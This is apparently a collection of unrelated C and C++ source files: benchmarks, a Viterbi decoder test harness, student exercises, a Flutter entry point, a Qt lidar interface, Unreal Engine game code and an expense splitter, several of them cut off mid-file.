    "#include <chrono>\n#include <cstddef>\n#include <cstdint>\n#include <iostream>\n#include <limits>\n#include <random>\n#include <type_traits>\n#include <algorithm>\n#include <iomanip>\n\nstd::random_device rd;\nstd::seed_seq ss{ rd(), rd(), rd(), rd() };\nstd::mt19937_64 rng(ss);\n\nstd::int32_t Calculate(std::int32_t* nums, std::int32_t size) noexcept\n{\n    auto onesCount = 0;\n    for (auto i = 0; i < size; i++) {\n        if (nums[i] == 1) {\n            onesCount++;\n        }\n    }\n\n\tif (onesCount == size) {\n        return 0;\n    }\n\n    auto windowCount = 0;\n    for (auto i = 0; i < onesCount; i++) {\n        if (nums[i] == 1) {\n            windowCount++;\n        }\n    }\n\n    auto maxCount = windowCount;\n    auto ii = 0;\n    auto j = onesCount;\n\t\n    for (;;)\n    {\n\t\tif (nums[ii] == 1) {\n            windowCount--;\n        }\n\n        if (nums[j] == 1) {\n            windowCount++;\n        }\n\n        maxCount = std::max(maxCount, windowCount);\n\n\t\tii++;\n\t\tif (ii == size) {\n            break;\n        }\n\n\t\tj++;\n        if (j == size) {\n            j = 0;\n        }\n    }\n\n    return onesCount - maxCount;\n}\n\nvoid FillArray(std::int32_t* arr, std::int32_t size)\n{\n    std::uniform_real_distribution<double> dist_double(0.0, 1.0);\n    std::uniform_int_distribution<int> dist_int;\n\n    for (std::int32_t i = 0; i < size; i++) {\n        if (dist_double(rng) < 0.5) {\n            arr[i] = 1;\n        }\n        else {\n            arr[i] = dist_int(rng);\n        }\n    }\n}\n\nvoid FillArrayTest(std::int32_t* arr, std::int32_t size)\n{\n    for (std::int32_t i = 0; i < size; i++) {\n        arr[i] = i;\n    }\n}\n\nvoid main()\n{\n    auto TRIAL_COUNT = 100;\n    auto testSize = 1000;\n\n    std::int32_t* testArr = new std::int32_t[testSize];\n    FillArrayTest(testArr, testSize);\n    std::cout << \"Test: \" << Calculate(testArr, testSize) << std::endl;\n\n\tauto accumulator = 0; // Prevent compiler from removing calls\n \n    // Warmup\n    for (auto i = 0; i < 10'000; i++) {\n        accumulator += Calculate(testArr, testSize);\n    }\n\n    delete[] testArr;\n\n    for (auto size : { 1, 10, 100, 1000, 10'000, 100'000, 1'000'000 })\n    {\n        std::int32_t* nums = new std::int32_t[size];\n        FillArray(nums, size);\n        std::cout << \"n = \" << size << std::setw(14);\n\n        auto begin = std::chrono::high_resolution_clock::now();\n        for (int i = TRIAL_COUNT; i--;) {\n            accumulator += Calculate(nums, size);\n        }\n        auto end = std::chrono::high_resolution_clock::now();\n\t\t\n        std::cout << std::fixed << std::setprecision(2)\n\t\t<< std::chrono::duration_cast<std::chrono::nanoseconds>(end - begin).count() / static_cast<double>(TRIAL_COUNT)\n            << \" ns\"\n            << std::endl;\n\t\t\t\n\t\tdelete[] nums;\n    }\n\n\tstd::cout << \"Accumulator: \" << accumulator;\n}",
    "#include <math.h>\n#include <stddef.h>\n#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <functional>\n#include <iostream>\n#include <memory>\n#include <optional>\n#include <vector>\n#include \"./argparse.hpp\"\n#include \"./ka9q_interface.h\"\n#include \"./span.h\"\n#include \"./spiral_interface.h\"\n#include \"./timer.h\"\n#include \"./util.h\"\n#include \"./viterbi_configs.h\"\n#include \"viterbi/convolutional_encoder_shift_register.h\"\n#include \"viterbi/viterbi_branch_table.h\"\n#include \"viterbi/viterbi_decoder_config.h\"\n#include \"viterbi/viterbi_decoder_core.h\"\n#include \"viterbi/x86/viterbi_decoder_avx_u16.h\"\n#include \"viterbi/x86/viterbi_decoder_avx_u8.h\"\n#include \"viterbi/x86/viterbi_decoder_sse_u16.h\"\n#include \"viterbi/x86/viterbi_decoder_sse_u8.h\"\n\nstatic FILE* const fp_log = stderr;\nstatic FILE* fp_out = stdout;\nstatic struct {\n    bool has_previous_object = false;\n} json_writer;\n\nstruct TestSample {\n    uint64_t init_ns = 0;\n    uint64_t update_symbols_ns = 0;\n    uint64_t chainback_bits_ns = 0;\n};\n\nstatic std::vector<TestSample> samples;\n\nstruct Test {\n    size_t K;\n    size_t R;\n    const int* poly;\n    size_t total_transmit_bits;\n    size_t total_input_bytes;\n    size_t total_output_symbols;\n    float sampling_time;\n    size_t minimum_samples;\n    std::vector<uint8_t> x_in;\n    std::vector<uint8_t> x_out;\n};\n\nstruct TestResult {\n    double bit_error_rate = 0.0f;\n};\n\ntemplate <typename T>\nvoid print_array(tcb::span<const T> data, const char* fmt) {\n    const size_t N = data.size();\n    fprintf(fp_out, \"[\");\n    for (size_t i = 0; i < N; i++) {\n        fprintf(fp_out, fmt, data[i]);\n        if (i != (N-1)) fprintf(fp_out, \",\");\n    }\n    fprintf(fp_out, \"]\");\n}\n\ntemplate <typename T, typename U>\nvoid print_array(tcb::span<const T> data, const std::function<U(const T&)> transform, const char* fmt) {\n    const size_t N = data.size();\n    fprintf(fp_out, \"[\");\n    for (size_t i = 0; i < N; i++) {\n        fprintf(fp_out, fmt, transform(data[i]));\n        if (i != (N-1)) fprintf(fp_out, \",\");\n    }\n    fprintf(fp_out, \"]\");\n}\n\nTestResult print_test(const char* name, const Test& test) {\n    if (json_writer.has_previous_object) {\n        fprintf(fp_out, \",\\n\");\n    }\n    json_writer.has_previous_object = true;\n    fprintf(fp_out, \"{\\n\");\n    fprintf(fp_out, \"  \\\"name\\\": \\\"%s\\\",\\n\", name);\n    fprintf(fp_out, \"  \\\"K\\\": %zu,\\n\", test.K);\n    fprintf(fp_out, \"  \\\"R\\\": %zu,\\n\", test.R);\n    fprintf(fp_out, \"  \\\"poly\\\": \");\n    print_array<int>({ test.poly, test.R }, \"%d\");\n    fprintf(fp_out, \",\\n\");\n\n    fprintf(fp_out, \"  \\\"total_input_bytes\\\": %zu,\\n\", test.total_input_bytes);\n    fprintf(fp_out, \"  \\\"total_transmit_bits\\\": %zu,\\n\", test.total_transmit_bits);\n    fprintf(fp_out, \"  \\\"total_output_symbols\\\": %zu,\\n\", test.total_output_symbols);\n    fprintf(fp_out, \"  \\\"sampling_time\\\": %f,\\n\", test.sampling_time);\n    fprintf(fp_out, \"  \\\"minimum_samples\\\": %zu,\\n\", test.minimum_samples);\n\n    fprintf(fp_out, \"  \\\"total_samples\\\": %zu,\\n\", samples.size());\n    fprintf(fp_out, \"  \\\"init_ns\\\": \");\n    print_array<TestSample, uint64_t>(samples, [](const TestSample& sample) { return sample.init_ns; }, \"%zu\");\n    fprintf(fp_out, \",\\n\");\n    fprintf(fp_out, \"  \\\"update_ns\\\": \");\n    print_array<TestSample, uint64_t>(samples, [](const TestSample& sample) { return sample.update_symbols_ns; }, \"%zu\");\n    fprintf(fp_out, \",\\n\");\n    fprintf(fp_out, \"  \\\"chainback_ns\\\": \");\n    print_array<TestSample, uint64_t>(samples, [](const TestSample& sample) { return sample.chainback_bits_ns; }, \"%zu\");\n    fprintf(fp_out, \",\\n\");\n\n    const size_t total_bits = test.x_out.size()*8;\n    const size_t total_bit_errors = get_total_bit_errors(test.x_in.data(), test.x_out.data(), test.x_in.size());\n    const float bit_error_rate = float(total_bit_errors) / float(total_bits);\n    fprintf(fp_out, \"  \\\"total_bits\\\": %zu,\\n\", total_bits);\n    fprintf(fp_out, \"  \\\"total_bit_errors\\\": %zu,\\n\", total_bit_errors);\n    fprintf(fp_out, \"  \\\"bit_error_rate\\\": %f\\n\", bit_error_rate);\n    fprintf(fp_out, \"}\");\n    return { bit_error_rate };\n}\n\ntemplate <size_t K, size_t R>\nTest init_test(const int* poly, const size_t total_decode_bytes, const float sampling_time, const size_t minimum_samples) {\n    fprintf(fp_log, \"[test_run]\\n\");\n    fprintf(fp_log, \"K=%zu, R=%zu\\n\", K, R);\n    fprintf(fp_log, \"total_input_bytes = %zu\\n\", total_decode_bytes);\n    // create decoder\n    const size_t total_decode_bits = total_decode_bytes*8;\n    const size_t total_tail_bits = K-1u;\n    const size_t total_transmit_bits = total_decode_bits + total_tail_bits;\n    const size_t total_symbols = total_transmit_bits*R;\n    // generate data\n    auto x_in = std::vector<uint8_t>(total_decode_bytes);\n    generate_random_bytes(x_in.data(), x_in.size());\n    // run tests\n    auto test = Test();\n    test.K = K;\n    test.R = R;\n    test.poly = poly;\n    test.total_input_bytes = total_decode_bytes;\n    test.total_output_symbols = total_symbols;\n    test.total_transmit_bits = total_transmi",
    "/* Escreva uma implementa\u00e7\u00e3o de pilha ilimitada, no sentido de que ela n\u00e3o deve possuir um limite conhecido a priori para o n\u00famero de elementos pass\u00edveis de nela serem armazenados. Ao inv\u00e9s de um vetor de tamanho fixo, a \"struct\" deve possuir um ponteiro que, durante a execu\u00e7\u00e3o da fun\u00e7\u00e3o de inicializa\u00e7\u00e3o, deve receber um pequeno vetor alocado dinamicamente. Sempre que a fun\u00e7\u00e3o \"empilhar\" encontrar o vetor cheio, ela deve (1) alocar um vetor maior, (2) copiar para ele os elementos da pilha, (3) desalocar o vetor atual e (4) passar a utilizar o vetor maior como o vetor da pilha. \nFazer as fun\u00e7\u00f5es Vazia(), Cheia(), Empilhar(), Desempilhar(), Pertence(), Mostrar()    */\n\n#include <iostream>\n#include <string>\n#include <new>\n#include <cstring>\n\nusing namespace std;\n\nstruct Pilha {\n\n    int lim_atual = 3;\n    int n = 0; //contador de numero de elementos na pilha\n    int* p = new int[lim_atual];\n\n};\n\nbool vazia (Pilha &a) {\n    return (a .n == 0);\n}\n\nbool cheia (Pilha &a) {\n    return (a .n == a .lim_atual);\n}\n\nbool pertence(Pilha &a, int x) {\n   for (int i = 0; i < a .n; i++)\n   {\n    if (a .p[i] == x)\n    {\n       return true;\n    }\n   }\n   return false;\n}\n\nbool empilhar (Pilha &a, int x) {\n    if (cheia(a)) {\n\n        int* v = new int[a .lim_atual];\n\n        memcpy (v, a .p, sizeof(int)*(a .lim_atual));\n\n        delete[] a .p;\n\n        a .lim_atual = (a .lim_atual) * 2 ;\n        \n        a .p = new int[a .lim_atual];\n\n        memcpy (a .p, v, sizeof(int)*(a .lim_atual));\n\n        delete[] v;\n\n    }\n\n    a .p[a .n] = x;\n    a .n += 1;\n\n    return true;\n\n}\n\nbool desempilhar(Pilha &a){\n\n    if (!vazia(a)){\n\n        int novo_tam = a .n - 1;\n\n        int* u = new int[novo_tam];\n\n        memcpy (u,a .p,sizeof(int)*novo_tam);\n\n        delete[] a .p;\n        \n        a .p = new int[novo_tam];\n\n        memcpy (a .p,u,sizeof(int)*novo_tam);\n\n        delete[] u;\n        \n    } else {\n        return false;\n    }\n\n    a .n -= 1;\n    return true;\n}\n\nvoid mostrar (Pilha &a) {\n\n    if (!vazia(a)){\n        cout << \"A pilha atual eh (Primeiro da pilha ... Ultimo da pilha): \";\n        for (int i = 0; i < (a .n); i++)\n        {\n            cout << a .p[i] << \" \";\n        }\n    } else {\n        cout << \"Pilha vazia, nada pra mostrar!\";\n    }\n}\n \nint main() {\n\n    Pilha pilha;\n    char opcao;\n\n    for (;;) {\n\n        cout << \"Escolha a acao (Empilhar, Desempilhar, Mostrar pilha, Pertence, Sair): \";\n\n        cin >> opcao;\n\n        cout << endl;\n\n        if (opcao == 'E') {\n            int valor;\n            cout << \"Digite o valor que quer empilhar:\";\n            cin >> valor;\n            cout << endl;\n            empilhar(pilha,valor);\n            cout << \"Valor empilhado com sucesso!\";\n        } \n        else if (opcao == 'D'){\n            if (desempilhar(pilha)){\n                cout << \"Desempilhado com sucesso\";\n            } else {\n                cout << \"A pilha esta vazia, impossivel desempilhar!\";\n            }\n        } \n        else if (opcao == 'M') {\n            mostrar(pilha);\n        }\n        else if (opcao == 'S') {\n\n            cout << endl;\n            cout << endl;\n            cout << \"P R O G R A M A    E N C E R R A D O\";\n            cout << endl;\n            cout << endl;\n            break;\n        }\n        else if (opcao == 'P') {\n            int valor;\n            cout << \"Digite o valor que quer ver se pertence: \";\n            cin >> valor;\n            cout << endl;\n            if (pertence(pilha,valor)) {\n                cout << \"Pertence a pilha!\";\n            } else {\n                cout << \"Nao pertence a pilha!\";\n            }\n\n        }\n\n\n        cout << endl;\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"simple_reminders\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"mainwindow.h\"\r\n#include \"ui_mainwindow.h\"\r\n\r\nMainWindow::MainWindow(QWidget *parent)\r\n    : QMainWindow(parent)\r\n    , ui(new Ui::MainWindow)\r\n{\r\n    ui->setupUi(this);\r\n    MainInfoForm* infoLidar = new MainInfoForm(this);\r\n    DataSubWidget* dataSub = new DataSubWidget();\r\n    // NetClient* nc = new NetClient(this);\r\n    m_sample = new Sample(this);\r\n    m_database = new Database(this);\r\n\r\n    ui->verticalLayout_Central->addWidget(infoLidar);\r\n    \r\n\r\n    qint32 laser_freq = 1000;\r\n    qint32 bytes_per_data = infoLidar->infoWidget->m_sample_mode?4:5;\r\n\r\n    connect(infoLidar->infoWidget, &InstanceInfoForm::sampleStop, this, [this](){\r\n        m_sample->sampleStop();\r\n    });\r\n\r\n    connect(infoLidar->infoWidget, &InstanceInfoForm::sampleStart, this, [this, infoLidar, laser_freq, &bytes_per_data](){\r\n\r\n        // bytes_per_data = infoLidar->infoWidget->m_sample_mode?4:5;\r\n\r\n        // qint32 psc = (infoLidar->infoWidget->Resolution())/(infoLidar->infoWidget->m_sample_mode?750:1500);\r\n        // qint32 tnum = infoLidar->infoWidget->SampleLength();\r\n        qint32 atime = infoLidar->infoWidget->AccumulateLength()*laser_freq;\r\n\r\n        m_sample->initSample(infoLidar->infoWidget->m_sample_mode);\r\n\r\n        m_sample->sampleStart(infoLidar->infoWidget->Resolution(), \r\n            infoLidar->infoWidget->SampleLength(),\r\n            infoLidar->infoWidget->AccumulateLength(),\r\n            infoLidar->infoWidget->isSampleContinuous\r\n        );\r\n\r\n        infoLidar->infoWidget->pbSampleCnt->setMaximum(atime);\r\n    });\r\n\r\n    // qint32 if_chn_finish = 0;\r\n\r\n    connect(m_sample->m_nc, &NetClient::progressUpdate, [=](qint32 cnt, quint32 chn){\r\n        // qDebug()<<\"chn\"<<chn<<\"cnt\"<<cnt<<\"in\"<<infoLidar->infoWidget->Chn();\r\n        quint32 chn_real = chn%4;\r\n        if(infoLidar->infoWidget->Chn()&(0x01<<chn_real)){\r\n            infoLidar->infoWidget->pbSampleCnt->setValue(cnt);\r\n            infoLidar->infoWidget->lnSampleCnt->display(cnt);\r\n        }\r\n\r\n    });\r\n\r\n    connect(m_sample, &Sample::sampleFinished, [=](){\r\n        infoLidar->infoWidget->setSampleUI(false);\r\n    });\r\n\r\n\r\n    connect(m_sample, &Sample::newDataValid, [=](QDateTime time, QMap<QString, QVector<float>> map){\r\n        // qDebug()<<data.size();\r\n        QString str_time = time.toString(\"hh:mm:ss\");\r\n        infoLidar->infoWidget->lLastFrameTime->setText(str_time);\r\n\r\n    });\r\n\r\n    connect(infoLidar->infoWidget->btnImport, &QPushButton::clicked, [this](){\r\n        QStringList files = QFileDialog::getOpenFileNames(this, QString(\"\u5bfc\u5165\"), \"../\", QString(\"File(*.csv*)\"));\r\n        qDebug() << \"file \" << files;\r\n        if(files.length()<=0){\r\n            return;\r\n        }\r\n        QFile f(files.at(0));\r\n\r\n        for(auto f:files){\r\n            QFile file(f);\r\n            importRecManual(file);\r\n        }\r\n\r\n        // bool retFlag = \r\n        \r\n        // m_listJsonLine = txtToJson(f);\r\n    });\r\n\r\n    connect(m_sample, &Sample::newDataValid, [this, infoLidar, dataSub](QDateTime time, QMap<QString, QVector<float>> map){\r\n        int groupSize = infoLidar->infoWidget->m_sample_mode?4:5;\r\n        QVariantMap vm{};\r\n\r\n        for(auto k:LidarData::keysRawInt){\r\n            if(map.contains(k)){\r\n                QVector<qint32> data_int = QVector<qint32>(map[k].begin(), map[k].end());\r\n                QFile file(\"../data/\"+k+\"_\"+time.toString(\"_yyyyMMdd_HHmmss\")+\".csv\");\r\n                if(file.open(QIODevice::WriteOnly|QIODevice::Text)){\r\n                    QTextStream out(&file);\r\n                    for(int i=0;i<data_int.size();i++){\r\n\r\n                        out<<QString::number(data_int[i])<<\", \"<<Qt::endl;\r\n                    }\r\n                }\r\n                file.close();\r\n                // dataSub->addData(data_int, LidarData::keysRawInt.indexOf(k));\r\n\r\n                QByteArray z_data = qCompress(QByteArray::fromRawData(\r\n                    reinterpret_cast<const char*>(map[k].constData()),\r\n                    sizeof(float) * map[k].size()\r\n                ));\r\n\r\n                // qDebug()<<k<<map[k].size()<<QByteArray::fromRawData(\r\n                //     reinterpret_cast<const char*>(map[k].constData()),\r\n                //     sizeof(float) * map[k].size()\r\n                // ).length()<<z_data.length();\r\n                vm.insert(k, z_data);\r\n\r\n                m_database->storeToDB(LidarData::types[1], time.toMSecsSinceEpoch(), vm);\r\n            }\r\n        }\r\n    });\r\n\r\n\r\n    connect(infoLidar->infoWidget->btnDataSub, &QPushButton::clicked, this, [=](){\r\n        dataSub->show();\r\n        dataSub->activateWindow();\r\n    });\r\n}\r\n\r\nbool MainWindow::importRecManual(QFile &f)\r\n{\r\n    QDateTime t = QDateTime::fromString(QFileInfo(f).baseName().right(15), \"yyyyMMdd_HHmmss\");\r\n    if (!t.isValid())\r\n    {\r\n        qDebug() << \"\u65e5\u671f\u89e3\u6790\u5931\u8d25\";\r\n        QMessageBox::information(NULL, \"\u9519\u8bef\", \"\u65e5\u671f\u89e3\u6790\u5931\u8d25\uff01\", QMessageBox::Ok);\r\n        t = QDateTime::currentDateTime();\r\n    }\r\n\r\n    qint32 chn_real = QFileInfo(f).baseName().mid(2, 1).toInt();\r\n  ",
    "#include <cstring>\n#include <iostream>\nusing namespace std;\n\n#include \"JSDUtils.h\"\n#include \"comp3.h\"\n\nvoid ruta_corta(char *i1, char *i2, char *nombre_objeto) {\n\n  if (!esNumero(i1) || !esNumero(i2)) {\n\n    cout << \"Error: Los parametros deben ser un numero\" << endl;\n    return;\n  }\n\n  cout << \"comando r_cercana\" << endl;\n  if (i1 == nullptr || i2)\n\n    if (nombre_objeto == nullptr)\n\n      cout << \"El nombre del objeto no ha sido cargado\" << endl;\n\n    else if (strcmp(i1, i2) == 0) {\n\n      cout << \"Los indices son iguales\" << endl;\n      cout << \"Parametro:\" << i1 << endl;\n      cout << \"Parametro:\" << i2 << endl;\n\n    } else {\n\n      cout << \"Parametro:\" << i1 << endl;\n      cout << \"Parametro:\" << i2 << endl;\n      cout << \"Parametro:\" << nombre_objeto << endl;\n    }\n}\n\nvoid ruta_corta_centro(char *i1, char *nombre_objeto) {\n\n  if (!esEntero(i1) || !esRacional(i1)) {\n\n    cout << \"Error: Los parametros deben ser un numero\" << endl;\n    return;\n  }\n\n  cout << \"comando r_cercana_centro\" << endl;\n  if (nombre_objeto == nullptr)\n\n    cout << \"El nombre del objeto no ha sido cargado\" << endl;\n\n  else {\n\n    cout << \"Parametro:\" << i1 << endl;\n    cout << \"Parametro:\" << nombre_objeto << endl;\n  }\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   pair.test.cpp                                      :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: caakkaya <caakkaya@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/08/03 16:57:18 by caakkaya          #+#    #+#             */\n/*   Updated: 2024/08/03 16:57:19 by caakkaya         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"../Pair.hpp\"\n#include \"../../test-utils/testUtils.hpp\"\n#include <string>\n\ntemplate <class T1, class T2>\nvoid test_pair_constructor()\n{\n    ft::Pair<T1, T2> a;\n    ft::Pair<T1, T2> b;\n\n    assert(a.first == T1());\n    assert(a.second == T2());\n\n    assert(a == b);\n}\n\nvoid test_pair_practical()\n{\n    ft::Pair<int, float> a(5, 5.5);\n    ft::Pair<int, float> b(10, 10.5);\n\n    assert(a.first == 5);\n    assert(a.second == 5.5);\n\n    assert(b.first == 10);\n    assert(b.second == 10.5);\n\n    assert(a < b);\n    assert(a <= b);\n    assert(b > a);\n    assert(b >= a);\n    assert(b != a);\n\n    a = b;\n\n    assert(a == b);\n    assert(a.first == 10);\n    assert(a.second == 10.5);\n}\n\nvoid test_pair()\n{\n    display(\"          === pair ===\", COLOR_CYAN);\n    test_pair_constructor<int, int>();\n    test_pair_constructor<float, int>();\n    test_pair_constructor<char, std::string>();\n    test_pair_constructor<char *, std::string>();\n    test_pair_constructor<char *, char *>();\n    test_pair_constructor<double, double>();\n\n    test_pair_practical();\n\n    display_success(\"Pair<T1, T2>\");\n}",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"BasicPlane.h\"\n#include \"Components/StaticMeshComponent.h\"\n#include \"Components/InterpToMovementComponent.h\"\n#include \"Components/BoxComponent.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"GameFramework/PlayerController.h\"\n#include \"GameFramework/Character.h\"\n#include \"TowerBlock.h\"\n#include \"PlaneBulletNEW.h\"\n#include \"Kismet/KismetMathLibrary.h\"\n#include \"TimerManager.h\"\n#include \"EngineUtils.h\"\n#include \"GameFramework/ProjectileMovementComponent.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"Components/SphereComponent.h\"\n\n\n// Sets default values\nABasicPlane::ABasicPlane()\n{\n\n\n\t// Set this pawn to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\tBoxCollide = CreateDefaultSubobject<UBoxComponent>(TEXT(\"Box Collider\"));\n\n\tRoot = CreateDefaultSubobject<USceneComponent>(TEXT(\"ROOT\"));\n\tRootComponent = Root;\n\n\n\tMesh = CreateDefaultSubobject<UStaticMeshComponent>(TEXT(\"Mesh\"));\n\tMesh->AttachToComponent(RootComponent, FAttachmentTransformRules::SnapToTargetIncludingScale);\n\tBoxCollide->AttachToComponent(RootComponent, FAttachmentTransformRules::SnapToTargetIncludingScale);\n\n\t\n}  \n\n\n\n\n// Called when the game starts or when spawned\nvoid ABasicPlane::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\t\n\n\t//Radius = 500;\n\n\t//FTimerHandle WhenSpawn;\n\t//GetWorld()->GetTimerManager().SetTimer(WhenSpawn, this, &ABasicPlane::InitTarget, 3.0f);\n\t//InitTarget();SetTimer(WhenSpaw, this, &ABasicPlane::InitTarget, 3.0f, false);\n\n\n\tAPlayerController* PlayerController = UGameplayStatics::GetPlayerController(GetWorld(), 0);\n\n\tif (PlayerController)\n\t{\n\n\t\t// Get the player character\n\t\tAPawn* PlayerPawn= PlayerController->GetPawn();\n\n\t\tATower* tt = CastChecked<ATower>(PlayerPawn);\n\n\t\tif (tt) {\n\n\t\t\tTarget = tt;\n\t\t}\n\t\t\n\t}\n\n\t//then the lerp from rotation to the place it will go to then spin around\n\n\t\n\n\n}\n//used to shoot\nvoid ABasicPlane::planeFire() {\n\tFActorSpawnParameters SpawnParams;\n\tSpawnParams.Instigator = this;\n\tSpawnParams.OverrideLevel = GetWorld()->GetCurrentLevel();\n\t//Cam->GetComponentRotation()Cam->GetComponentLocation()\n\tFTimerHandle FireTimer;\n\n\t//FVector Forward = GetActorLocation() - Target->GetActorLocation();\n\tFVector Forward = GetActorLocation() - Target->TowerStack[Block]->BoxCollide->GetComponentLocation();\n\tFVector WorldUp = FVector::UpVector;\n\n\tFRotator Rota = UKismetMathLibrary::MakeRotFromXZ(Forward, WorldUp);\n\n\tAActor* Bullo = GetWorld()->SpawnActor<APlaneBulletNEW>(Bulletito, GetActorLocation(), Rota, SpawnParams);\n\n\tif (Cast<APlaneBulletNEW>(Bullo)) {\n\t\tCast<APlaneBulletNEW>(Bullo)->SetterVelocityo(Rota.Vector() * -500);\n\t}\n\n\t\n\n}\n\n// Called every frame\nvoid ABasicPlane::Tick(float DeltaTime)\n{\n\tSuper::Tick(DeltaTime);\n\n\t\n\n\t//JHohnscon\n\t\n\t//Target = GameMode->GetPlayer\n\n\t// = GameMode->Get\n\n\n\n\n\n\tif (Target) {\n\n\t\tif (GEngine)\n\t\t{\n\t\t\t//GEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Green, FString::Printf(TEXT(\"Vector: %s\"), (TEXT(\"HAMMUD\"))));\n\n\t\t}\n\n\t\tif (Target->CheckBlockExistance()) {\n\n\t\t\tMovePlane(DeltaTime);\n\t\t\tif (canFire) {\n\n\t\t\t\tif (GEngine) {\n\t\t\t\t\t//GEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Green, FString(TEXT(\"Spawned\")));\n\n\t\t\t\t}\n\n\t\t\t\tplaneFire();\n\t\t\t\tcanFire = false;\n\t\t\t\t\n\t\t\t\tFTimerHandle FireTimer;\n\t\t\t\tGetWorld()->GetTimerManager().SetTimer(FireTimer, this, &ABasicPlane::ResetFire, 1);\n\t\t\t}\n\t\t\t\n\t\t}\n\n\t\t\n\t}\n\n\n\n}\n\nvoid ABasicPlane::ResetFire() {\n\n\tcanFire = true;\n}\n\nvoid ABasicPlane::MovePlane(float Delta) {\n\n\tif (GEngine) {\n\t\t//GEngine->AddOnScreenDebugMessage(-1, 5.f, FColor::Green, FString(TEXT(\"Moving\")));\n\n\t}\n\n\t//UBoxComponent* TowerCollide = Target->FindComponentByClass<UBoxComponent>();\n\n\t//FVector FBOX = TowerCollide->GetScaledBoxExtent();\n\n\t//float height = FBOX.Z * HeightPercent;\n\n\n\t//FRotator Rot = GetActorRotation();\n\t//FVector Location = GetActorLocation();\n\n\t//FRotator NewRot = FRotator(Rot.Yaw, Rot.Pitch, Rot.Roll + Delta * 0.1);\n\n\t/*\n\tif (CurRadius / DesRadius <= 1.0001 || CurRadius / DesRadius >= 9.9999) {\n\t\t\n\t\tif (CurRadius > DesRadius) {\n\n\t\t\tCurRadius = CurRadius - Delta * 50;\n\t\t}\n\t\tif (CurRadius < DesRadius) {\n\n\t\t\tCurRadius = CurRadius + Delta * 50;\n\t\t}\n\n\t\t\n\n\n\t}\n\n\t*/\n\n\n\t//Lowkey quadratic but can change to linear if you really want!\n\tCurRadius = FMath::Lerp(CurRadius, DesRadius, Delta);\n\n\n\t//if (GEngine) {\n\t\t//GEngine->AddOnScreenDebugMessage(-1, 20.f, FColor::Purple, FString::FromInt(CurRadius));\n\t//}\n\n\n\t\t//PROB PUT ALL IN A FUCNTION THAT RUNS ONCE but as it looks not it will ot be bad\n\t\tFRotator off;\n\t\tif (isCounter) {\n\t\t\toff = FRotator(90, 0, 0);\n\t\t}\n\t\telse {\n\t\t\toff = FRotator(-90, 0, 0);\n\t\t}\n\n\n\n\t\n\t//FVector EEE = NewRot.RotateVector(TempLoco);\n\n\t//EEE.X\n\n\n\t//UBoxComponent* TowerCollide = Target->FindComponentByClass<UBoxComponent>();\n\n\t//FVector FBOX = TowerCollide->GetScaledBoxExtent();\n\n\tif (Target->TowerStack[Block]) {\n\n\t\t//UBoxComponent* TowerCollide = Target->TowerStack[Block]->FindComponen",
    "#include <algorithm>\n#include <cmath>\n#include <fstream>\n#include <iostream>\n#include <sstream>\n#include <string>\n#include <vector>\nusing namespace std;\n\nconst char COMMA_DELIMITER = ',';\nconst char SEMI_COLON_DELIMITER = ';';\nconst char COLON_DELIMITER = ':';\nconst int START_OF_LINE = 0;\nconst float EQUALLY_SPLIT = 0;\nconst string EQUALLY = \"equally\";\nconst string UNEQUALLY = \"unequally\";\nconst string ADJUSTMENT = \"adjustment\";\ntypedef struct expenses expenses;\ntypedef struct sort_output output;\ntypedef const char route;\ntypedef vector<float> money;\ntypedef vector<string> name;\ntypedef vector<expenses> cost;\nstruct expenses {\n  name names;\n  money amount;\n};\n\nstruct sort_output {\n  name payer;\n  name deptor;\n  money amount;\n};\n\nvoid discard_first_line(ifstream &file) {\n  string usless_line;\n  getline(file, usless_line);\n}\n\nname extract_names(route *file_path) {\n  name identity;\n  string current_name;\n  ifstream file;\n  file.open(file_path);\n  file.seekg(START_OF_LINE);\n  discard_first_line(file);\n  while (!file.eof()) {\n    getline(file, current_name);\n    identity.push_back(current_name);\n  }\n  file.close();\n  return identity;\n}\n\nname extract_type_expenses(route *file_path) {\n  name types;\n  ifstream file;\n  file.open(file_path);\n  file.seekg(START_OF_LINE);\n  discard_first_line(file);\n  string each_line;\n  while (getline(file, each_line)) {\n    istringstream stream_line(each_line);\n    string type_name;\n    getline(stream_line, type_name, COMMA_DELIMITER);\n    types.push_back(type_name);\n  }\n  file.close();\n  return types;\n}\n\nname extract_payers_lines(route *file_path) {\n  name payer_lines;\n  ifstream file;\n  file.open(file_path);\n  